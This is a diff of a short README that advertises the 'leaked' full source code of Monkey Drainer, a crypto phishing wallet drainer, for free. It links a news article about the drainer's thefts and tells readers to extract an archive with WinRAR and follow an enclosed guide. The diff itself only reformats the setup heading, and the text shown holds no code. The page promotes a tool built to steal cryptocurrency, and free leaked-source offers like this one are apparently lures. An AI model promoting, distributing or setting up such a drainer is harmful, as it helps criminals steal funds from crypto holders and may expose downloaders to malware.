@@ -1,7 +1,8 @@
 # FREE! ` [Monkey Drainer Full Source Code Leaked] `
  ### 📩**Click here [cointelegraph](https://cointelegraph.com/news/phishing-scammer-monkey-drainer-has-pilfered-as-much-as-1m-in-ethereum) to read the artical about monkey drainer on cointelegraph.**
 ---
-## 🔥 How to setup- extract the file with winrar and read the guide inside the folder.
+## 🔥 How to setup ? 
+extract the file with winrar and read the guide inside the folder.
 
 ### <center>❄️ Monkey Drainer™
 ![Preview](https://cdn.discordapp.com/attachments/1011077087630741647/1063552459986964500/ssnsn.png)
